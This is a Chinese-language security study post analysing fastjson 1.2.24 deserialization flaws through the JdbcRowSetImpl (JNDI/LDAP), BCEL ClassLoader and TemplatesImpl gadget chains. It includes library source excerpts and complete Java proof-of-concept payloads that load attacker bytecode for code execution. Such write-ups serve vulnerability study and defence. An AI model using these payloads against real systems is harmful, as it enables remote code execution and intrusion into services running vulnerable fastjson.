参考视频：[fastjson反序列化漏洞2-1.2.24利用](https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&vd_source=686636e30f91f8a12e28751943870859)

参考博客：[Fastjson系列二——1.2.22-1.2.24反序列化漏洞](http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E9%99%90%E5%88%B6)

# 分析版本

fastjson1.2.24

JDK 8u141

# fastjson反序列化特点

1. 不需要实现Serializable

   因为对于找不到符合条件的反序列化器，就把类当作JavaBean。

2. 变量有对应的setter，getter（返回值类型需要满足条件），public属性

3. 触发点setter，getter

4. sink 反射/动态类加载

我们在json中指定@type参数，故fastjson会尝试将该字符串反序列化为指定类的对象，并调用类中的set方法给对象进行赋值，把反序列化后拿到的对象toJSON时用get方法。

# JdbcRowSetImpl链

## 分析过程

利用的是JdbcRowSetImpl这个类

```java
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); //很明显能看出来是JNDI的lookup
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

我们想下利用链流程，

首先要给DataSourceName赋值，DataSourceName的setter和getter方法都有。**但是注意getter方法的返回值类型，分析源码的时候讲到了加载反序列化器时要触发getter方法返回值只能是几个类型。这里getter不会被触发。（在后续的toJSON中会被触发）**

之后要触发connect()方法，查找谁调用了它。发现setter和getter方法都有，和上面一样的。

![image-20240731153003344](https://s2.loli.net/2024/07/31/1npHTgQdZCbiG52.png)

这里选setAutoCommit方法。

我们都选择set方法，利用起来方便些。

```java
public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();
        this.conn.setAutoCommit(var1);
    }

}
```

## 攻击实现

根据上面分析，很容易把payload写出来，fastjson通过我们给的json反序列化出一个JdbcRowSetImpl对象，过程中先调用setDataSourceName给dataSourceName赋值再调用setAutoCommit --> connect()

下面用的JNDI+LDAP攻击，我用的8u141，JNDI还没修复。

```java
public class FastJsonJdbcRowSetImpl {
    public static void main(String[] args) throws Exception {
        //JdbcRowSetImpl
        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:10389/cn=Exp,dc=example,dc=com\",\"autoCommit\":0}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
        //LdapCtx
    }
}
```

这里要注意dataSourceName的写法，因为fastjson是根据setter和getter获取的属性，所以名字要根据setter和getter的名字写，而不是根据对应属性名写。

# Bcel链

上面讲到的JdbcRowSetImpl链，是和JNDI注入结合使用，会收到JDK版本限制。

Bcel链不受JDK版本限制。

## 分析过程

首先JDK内置`com.sun.org.apache.bcel.internal.util.ClassLoader`类，分析写在注释里了。

```java
protected Class loadClass(String class_name, boolean resolve)
  throws ClassNotFoundException
{
  Class cl = null;

  /* First try: lookup hash table.
   */
  if((cl=(Class)classes.get(class_name)) == null) {
    /* Second try: Load system class using system class loader. You better
     * don't mess around with them.
     */
    for(int i=0; i < ignored_packages.length; i++) {
      if(class_name.startsWith(ignored_packages[i])) {
        cl = deferTo.loadClass(class_name);
        break;
      }
    }

    if(cl == null) {
      JavaClass clazz = null;

      /* Third try: Special request?
       */
      if(class_name.indexOf("$$BCEL$$") >= 0)                           //如果传进来的字节码包含$$BCEL$$
        clazz = createClass(class_name);                                //调用createClass(class_name);拿到解密完成的字节码     
      else { // Fourth try: Load classes via repository
        if ((clazz = repository.loadClass(class_name)) != null) {
          clazz = modifyClass(clazz);
        }
        else
          throw new ClassNotFoundException(class_name);
      }

      if(clazz != null) {
        byte[] bytes  = clazz.getBytes();                               
        cl = defineClass(class_name, bytes, 0, bytes.length);           //调用defineClass加载字节码  
      } else // Fourth try: Use default class loader
        cl = Class.forName(class_name);
    }

    if(resolve)
      resolveClass(cl);
  }

  classes.put(class_name, cl);

  return cl;
}
```

```java
protected JavaClass createClass(String class_name) {
  int    index     = class_name.indexOf("$$BCEL$$");
  String real_name = class_name.substring(index + 8);   //取$$BCEL$$后面字符串

  JavaClass clazz = null;
  try {
    byte[]      bytes  = Utility.decode(real_name, true); //将字符串解密
    ClassParser parser = new ClassParser(new ByteArrayInputStream(bytes), "foo");

    clazz = parser.parse();
  } catch(Throwable e) {
    e.printStackTrace();
    return null;
  }

  // Adapt the class name to the passed value
  ConstantPool cp = clazz.getConstantPool();

  ConstantClass cl = (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),
                                                   Constants.CONSTANT_Class);
  ConstantUtf8 name = (ConstantUtf8)cp.getConstant(cl.getNameIndex(),
                                                   Constants.CONSTANT_Utf8);
  name.setBytes(class_name.replace('.', '/'));

  return clazz;
}
```

所以我们将恶意字节码加密并在前面加上$$BCEL$$，就可以弹计算器了。

```java
public class FastJsonBcel {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Exp.class"));
        String encode = Utility.encode(code,true);
        ClassLoader classLoader = new ClassLoader();
        classLoader.loadClass("$$BCEL$$"+encode).newInstance();
    }
}
```

之后看是否有一个类，可以实现`classLoader.loadClass("$$BCEL$$"+encode).newInstance();`

发现tomcat的一个类`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`，正好满足这个条件

```java
protected ConnectionFactory createConnectionFactory() throws SQLException {
    // Load the JDBC driver class
    Driver driverToUse = this.driver;

    if (driverToUse == null) {
        Class<?> driverFromCCL = null;
        if (driverClassName != null) {
            try {
                try {
                    if (driverClassLoader == null) {                   
                        driverFromCCL = Class.forName(driverClassName);
                    } else {
                        driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);  //保证driveClassLoader不为NULL，进入这个循环，
                    }
```

driverClassName赋值为我们的字节码。

这里调用的是forName之前在双亲委派中也说到了

```java
    ClassLoader classLoader = ClassLoader.getSystemClassLoader();
    Class<?> person = classLoader.loadClass("Person");             //默认不初始化，对应forName的false
    Class<?> person = Class.forName("Person", false, classLoader); //两个代码作用相同
```

之后就要看driveClassLoader，driverClassName的赋值了。（看有没有对应的setter赋值方法）

正好是是有对应的setter方法的，我就不贴出来了。

最后还要看下怎么调用执行这个createConnectionFactory()方法，也要往上找，直到找到setter和getter方法。

![image-20240731192326952](https://s2.loli.net/2024/08/01/Ida2uxh9AlQicXP.png)

![image-20240731192347562](https://s2.loli.net/2024/08/01/9mBGHVKxcbzUTA4.png)

最后setter，getter方法也找到了。

这里选择getConnection()方法，用set方法的话还得引入新的类。这里调用get方法的话也是在toJSON调用（方法返回Connect，过不了判断，不会在生成反序列化器中调用），顺序很清晰。

更新payload

```java
public class FastJsonBcel {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Exp.class"));
        String encode = Utility.encode(code,true);
        ClassLoader classLoader = new ClassLoader();
        //classLoader.loadClass("$$BCEL$$"+encode).newInstance();


        BasicDataSource basicDataSource = new BasicDataSource();
        basicDataSource.setDriverClassName("$$BCEL$$"+encode);
        basicDataSource.setDriverClassLoader(classLoader);
        basicDataSource.getConnection();
    }
}
```

最终payload

```java
public class FastJsonBcel {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Exp.class"));
        String encode = Utility.encode(code,true);
        ClassLoader classLoader = new ClassLoader();
        //classLoader.loadClass("$$BCEL$$"+encode).newInstance();


//        BasicDataSource basicDataSource = new BasicDataSource();
//        basicDataSource.setDriverClassName("$$BCEL$$"+encode);
//        basicDataSource.setDriverClassLoader(classLoader);
//        basicDataSource.getConnection();

        //String s = "{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}";
        String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"DriverClassName\":\"$$BCEL$$" + encode +"\",\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSONObject jsonObject = JSON.parseObject(s);
    }
}
```

# TemplateImpl链

这个链是联系到了CB链中找到的TemplatesImpl的getOutputProperties，用到了get方法，而fastjson是可以触发get方法的。

```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties(); //CC3中动态加载类是由newTransformer调用的
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

具体细节就不分析了（不使用，实现攻击需要传很多没有setter和getter的变量，所以要fastjson开启一个参数）

```java
public class FastJsonTemplateImpl {
    public static void main(String[] args) throws Exception{
        //byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        String code = readClass("G:\\Java反序列化\\class_test\\Test.class");
        //System.out.println(readClass("G:\\Java反序列化\\class_test\\Test.class"));
        //byte[][] codes = {code};
//        TemplatesImpl templates = new TemplatesImpl();
//        Class templatesClass = templates.getClass();
//        Field name = templatesClass.getDeclaredField("_name");
//        name.setAccessible(true);
//        name.set(templates, "pass");
//
//        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
//        bytecodes.setAccessible(true);
//        //bytecodes.set(templates, codes);
//
//        Field tfactory = templatesClass.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, new TransformerFactoryImpl());

        String s = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_name\":\"pass\",\"_bytecodes\":[\"" + code + "\"],\"_tfactory\":{},\"_outputProperties\":{}}";
        JSONObject jsonObject = JSON.parseObject(s, Feature.SupportNonPublicField);
        System.out.println(jsonObject);
    }


    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }
}
```

开始我想省略`\"_outputProperties\":{}`，但是发现`JSON.parseObject(s, Feature.SupportNonPublicField);`不会调用toJSON也就是不会在组后把所有getter方法都调用一遍，并且在`return (JSONObject) parse(text, features);`中就抛出了异常，所以要加上这句话让getOutputProperties在生成反序列化器时执行。

![image-20240801145227806](https://s2.loli.net/2024/08/01/4BXUQJxKhaAp3cY.png)